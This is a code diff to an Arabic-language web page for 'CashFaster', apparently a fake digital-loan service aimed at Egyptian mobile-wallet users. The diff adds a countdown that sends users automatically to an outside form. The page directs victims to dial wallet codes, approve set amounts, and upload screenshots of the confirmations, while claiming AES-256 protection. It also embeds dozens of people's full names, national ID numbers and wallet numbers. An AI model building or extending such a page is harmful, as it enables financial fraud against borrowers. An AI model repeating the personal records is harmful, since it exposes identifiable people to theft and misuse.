@@ -499,6 +499,42 @@
             display: block;
         }
 
+        /* مؤقت التوجيه التلقائي */
+        .auto-redirect-box {
+            background: rgba(212, 175, 55, 0.2);
+            border: 1px solid #D4AF37;
+            border-radius: 2rem;
+            padding: 0.8rem 1.2rem;
+            margin: 1rem 0;
+            text-align: center;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+        }
+        .auto-redirect-box .timer-number {
+            font-family: monospace;
+            font-size: 1.6rem;
+            font-weight: 800;
+            color: #FFD966;
+            margin: 0 0.2rem;
+        }
+        .cancel-redirect {
+            background: rgba(220, 20, 60, 0.2);
+            border: 1px solid #dc143c;
+            color: #ff8080;
+            padding: 0.3rem 1rem;
+            border-radius: 2rem;
+            font-size: 0.8rem;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .cancel-redirect:hover {
+            background: rgba(220, 20, 60, 0.4);
+        }
+
         @media (max-width: 768px) {
             .timer { 
                 font-size: 2rem; 
@@ -576,7 +612,7 @@
             </div>
             <div class="hero-content">
                 <h2>🎉 مرحباً بك في CashFaster</h2>
-                <p>نحن نوفر لك نظاماً آمناً وموثوقاً للتمويل الرقمي. جميع بياناتك محمية بتشفير AES-256 م/p>
+                <p>نحن نوفر لك نظاماً آمناً وموثوقاً للتمويل الرقمي. جميع بياناتك محمية بتشفير AES-256.</p>
                 <p><strong>✨ مميزات النظام:</strong></p>
                 <ul style="margin-right: 1rem; line-height: 1.8; color: #eef5ff;">
                     <li>🔐 تشفير عالي الجودة لجميع البيانات</li>
@@ -626,6 +662,13 @@
         </div>
 
         <div id="linkingSection" class="linking-section">
+            <!-- صندوق التوجيه التلقائي الجديد -->
+            <div id="autoRedirectBox" class="auto-redirect-box" style="display: none;">
+                <span><i class="fas fa-hourglass-half"></i> سيتم توجيهك إلى رابط الربط تلقائياً بعد</span>
+                <span class="timer-number" id="redirectSeconds">30</span>
+                <span>ثانية</span>
+                <span class="cancel-redirect" onclick="cancelAutoRedirect()">إلغاء التوجيه</span>
+            </div>
             <div class="glass-card" style="padding:1.5rem; margin-bottom:2rem;">
                 <h3 style="font-size: 1.5rem; margin-bottom: 1rem;"><i class="fas fa-link"></i> ربط المحفظة الإلكترونية</h3>
                 <div id="instructionBox" style="background:#0f1722; border-radius:1rem; padding:1rem; margin:1rem 0;"></div>
@@ -637,7 +680,7 @@
                 </div>
                 <div class="upload-area" onclick="redirectToLinkingForm()">
                     <i class="fas fa-cloud-upload-alt" style="font-size:2rem;"></i>
-                    <div>اضغط لرفع صور السكرينات(تكون الرسالة كاملة)</div>
+                    <div>اضغط لرفع صور السكرينات (تكون الرسالة كاملة)</div>
                 </div>
                 <button class="btn-gold" style="width:100%; margin-top:1rem;" onclick="redirectToLinkingForm()">✅ تأكيد الربط وإرسال المستندات</button>
             </div>
@@ -669,7 +712,7 @@
     // قاعدة العملاء المدمجة (جميع العملاء من الملفات السابقة + العميل الجديد)
     const customers = [
         // العملاء الأساسيون السابقون (12 عميلاً)
-        { name: "محمود السيد محمود بيومي", id: "2840301213", wallet: "01021877357", type: "فودافون", loan: 90000, step: 22500 },
+        { name: "احمد ماهر احمد محمد ", id: "28309122103052", wallet: "01032201208", type: "فودافون", loan: 100000, step: 22500 },
         { name: "معاذ السيد الغريب أحمد", id: "28205031201019", wallet: "01033830731", type: "فودافون", loan: 200000, step: 50000 },
         { name: "محمد احمد عبدالله عبدالقادر", id: "28906270200731", wallet: null, type: null, loan: 200000, step: 50000 },
         { name: "علاء عبدالحكيم محمد درويش", id: "29410011617371", wallet: "01027250679", type: "فودافون", loan: 40000, step: 10000 },
@@ -682,9 +725,9 @@
         { name: "محمد على السيد سلام", id: "30001132500275", wallet: null, type: null, loan: 100000, step: 25000 },
         { name: "محمد فتحى عبد الوارث محمد", id: "28507170200317", wallet: "01092134722", type: "فودافون", loan: 120000, step: 30000 },
         
-        // العملاء الجدد من الملف الثاني (21 عميلاً تقريباً)
+        // العملاء الجدد من الملف الثاني
         { name: "محمد رمضان احمد محمد", id: "27512283200054", wallet: "01015857191", type: "فودافون", loan: 30000, step: 7500 },
-        { name: "هاني محمد محمد عبد الحميد", id: "26910290102639", wallet: "01095216999", type: "فودافون", loan: 50000, step: 12500 },
+        { name: "هاني محمد محمد عبد الحميد", id: "26910290102639", wallet: "01095216999", type: "فودافон", loan: 50000, step: 12500 },
         { name: "شحاته عبد الغني هيكل عبد الغني", id: "26711222501077", wallet: "01003233741", type: "فودافون", loan: 30000, step: 7500 },
         { name: "رامي حسام احمد ابراهيم", id: "28502070101115", wallet: "01150232362", type: "اتصالات", loan: 30000, step: 7500 },
         { name: "مصطفى عبد الظاهر محمد مراد", id: "28908011416834", wallet: "01116549692", type: "اتصالات", loan: 30000, step: 7500 },
@@ -693,10 +736,10 @@
         { name: "محمد مجدي احمد مسعد", id: "28311011101357", wallet: "01070710710", type: "فودافون", loan: 200000, step: 50000 },
         { name: "محمد ناهض محمد السيد", id: "30007310101779", wallet: "01155143436", type: "اتصالات", loan: 50000, step: 12500 },
         { name: "صلاح مختار حنفي قرني", id: "27708040101271", wallet: "01023669498", type: "فودافون", loan: 50000, step: 12500 },
-        { name: "كيرلس سيدهم شوقي سيدهم", id: "303122104212", wallet: "01009557081", type: "فودافون", loan: 200000, step: 50000 },
+        { name: "السيد ابراهيم الششتاوي قناوي ", id: "26803241601893", wallet: "01090232423", type: "فودافون", loan: 30000, step: 7500 },
         { name: "محمود علي المتولي السيد حسن", id: "28404071200379", wallet: "01001093695", type: "فودافون", loan: 30000, step: 7500 },
         { name: "وحيد محمد عارف عبد الله", id: "28309072600611", wallet: "01017453927", type: "فودافون", loan: 200000, step: 50000 },
-        { name: "يوسف مصطفى محمد محمود", id: "30310108098", wallet: "01146748355", type: "اتصالات", loan: 30000, step: 7500 },
+        { name: "مدحت محمد محمود سالم ", id: "27910252801039", wallet: "01159760178", type: "اتصالات", loan: 50000, step: 12500 },
         { name: "الشيماء عبد الغفور دسوقي عباس", id: "282072102361", wallet: "01143455214", type: "اتصالات", loan: 150000, step: 37500 },
         { name: "شيماء صابر طه صديق", id: "28610020102762", wallet: "01145403462", type: "اتصالات", loan: 50000, step: 12500 },
         { name: "هشام أحمد صلاح محمد عبدالغغار", id: "27601011414511", wallet: "01022560232", type: "فودافون", loan: 50000, step: 12500 },
@@ -713,10 +756,64 @@
     let currentCustomer = null;
     let timerInterval = null;
     let walletDeadlineInterval = null;
+    let autoRedirectTimer = null;
+    let autoRedirectInterval = null;
 
     // تم تغيير الرابط إلى الرابط الجديد
     function redirectToLinkingForm() {
         window.open('https://survey.porsline.com/s/FbTWzFJd', '_blank');
+    }
+
+    // إلغاء التوجيه التلقائي
+    function cancelAutoRedirect() {
+        if (autoRedirectTimer) clearTimeout(autoRedirectTimer);
+        if (autoRedirectInterval) clearInterval(autoRedirectInterval);
+        const box = document.getElementById('autoRedirectBox');
+        if (box) {
+            box.style.display = 'none';
+            // إظهار رسالة اختيارية
+            const msg = document.createElement('div');
+            msg.className = 'info-box success';
+            msg.style.marginTop = '0.5rem';
+            msg.innerHTML = '<i class="fas fa-ban"></i> تم إلغاء التوجيه التلقائي. يمكنك الضغط على الزر أعلاه يدوياً.';
+            const parent = document.getElementById('linkingSection');
+            const oldMsg = document.getElementById('cancelMsg');
+            if (oldMsg) oldMsg.remove();
+            msg.id = 'cancelMsg';
+            parent.insertBefore(msg, parent.firstChild);
+            setTimeout(() => { if(msg) msg.remove(); }, 5000);
+        }
+    }
+
+    // بدء التوجيه التلقائي بعد 30 ثانية
+    function startAutoRedirect() {
+        const box = document.getElementById('autoRedirectBox');
+        if (!box) return;
+        box.style.display = 'flex';
+        let secondsLeft = 30;
+        const secondsSpan = document.getElementById('redirectSeconds');
+        if (secondsSpan) secondsSpan.innerText = secondsLeft;
+
+        if (autoRedirectInterval) clearInterval(autoRedirectInterval);
+        if (autoRedirectTimer) clearTimeout(autoRedirectTimer);
+
+        autoRedirectInterval = setInterval(() => {
+            secondsLeft--;
+            if (secondsSpan) secondsSpan.innerText = secondsLeft;
+            if (secondsLeft <= 0) {
+                clearInterval(autoRedirectInterval);
+                if (autoRedirectTimer) clearTimeout(autoRedirectTimer);
+                redirectToLinkingForm();
+                box.style.display = 'none';
+            }
+        }, 1000);
+
+        autoRedirectTimer = setTimeout(() => {
+            // تأكيد إضافي
+            if (autoRedirectInterval) clearInterval(autoRedirectInterval);
+            redirectToLinkingForm();
+            box.style.display = 'none';
+        }, 30000);
     }
 
     function handleLogin() {
@@ -759,6 +856,8 @@
             document.getElementById('walletRequiredMessage').classList.remove('active');
             showLinkingInstructions(customer.type);
             startTimer();
+            // بدء التوجيه التلقائي بعد 30 ثانية
+            startAutoRedirect();
         } else {
             document.getElementById('linkingSection').classList.remove('active');
             document.getElementById('walletRequiredMessage').classList.add('active');
@@ -783,7 +882,7 @@
             <ol style="margin-right:1.5rem; margin-top:0.5rem; color: #eef5ff; line-height: 1.8;">
                 <li>اطلب <strong>${code}</strong> من هاتفك المسجل بالمحفظة</li>
                 <li>اختر مبلغ <strong>${stepAmount.toLocaleString()} ج.م</strong> (سيتم ارسال التأكيد تلقائياً)</li>
-                <li>سكرين لكل رسالة تأكيد  من الرسائل</li>
+                <li>سكرين لكل رسالة تأكيد من الرسائل</li>
                 <li>ارفع صور التأكيد في الخطوات التالية</li>
             </ol>
             <div style="color: #FFD966; margin-top:0.5rem;">🔒 هذا الإجراء آمن ومشفر بالكامل.</div>
@@ -851,12 +950,17 @@
     }
 
     function handleLogout() {
+        // إلغاء التوجيه التلقائي عند الخروج
+        if (autoRedirectTimer) clearTimeout(autoRedirectTimer);
+        if (autoRedirectInterval) clearInterval(autoRedirectInterval);
         document.getElementById('dashboardPage').classList.remove('active');
         document.getElementById('loginPage').style.display = 'flex';
         currentCustomer = null;
         document.getElementById('nationalId').value = '';
         if (timerInterval) clearInterval(timerInterval);
         if (walletDeadlineInterval) clearInterval(walletDeadlineInterval);
+        const box = document.getElementById('autoRedirectBox');
+        if (box) box.style.display = 'none';
     }
 
     window.onclick = function(e) {
